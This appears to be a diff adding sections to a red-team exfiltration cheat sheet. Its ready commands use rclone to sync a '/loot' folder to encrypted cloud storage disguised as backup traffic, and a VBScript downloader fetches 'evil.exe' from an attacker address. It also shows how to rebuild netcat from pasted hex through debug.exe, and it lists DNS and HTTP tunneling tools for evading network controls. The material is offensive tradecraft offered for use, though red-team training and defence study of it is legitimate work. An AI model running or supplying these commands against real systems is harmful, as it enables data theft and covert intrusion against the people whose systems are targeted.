@@ -130,3 +130,39 @@ Abuse trusted collaboration platforms via write-only webhooks. No API keys requi
 
 ### Rclone (Cloud Sync)
 Encrypt and sync data to cloud storage, blending in with backup traffic:
+```bash
+# Setup remote (s3/webdav) -> Encrypt (crypt) -> Chunk (chunker)
+rclone config
+rclone copy /loot secret:/$(hostname)-$(date +%F) --bwlimit 4M
+```
+
+## Living Off the Land (Windows)
+
+### VBScript (No PowerShell)
+Generate a downloader script:
+```powershell
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+... (See full snippet in course)
+cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
+```
+
+### Debug.exe (Binary Reconstruction)
+Rebuild files up to 64KB using hex in the shell:
+```bash
+upx -9 nc.exe
+wine exe2bat.exe nc.exe nc.txt
+```
+
+Copy and paste the generated text file into the Windows shell to reconstruct `nc.exe`.
+
+---
+
+## Tunneling & Encapsulation (Quick Reference)
+- **Dnscat2 / Iodine:** Full DNS tunneling for bypassing captive portals.
+    
+- **Socat / Chisel:** TCP over HTTP/HTTPS wrapping.
+    
+- **goshs:** Native SMB/WebDAV/SFTP for file transfers.
+    
+
+_Tags: #exfiltration #redteam #infosec #cheatsheet #livingofftheland #datatheft #ttp_
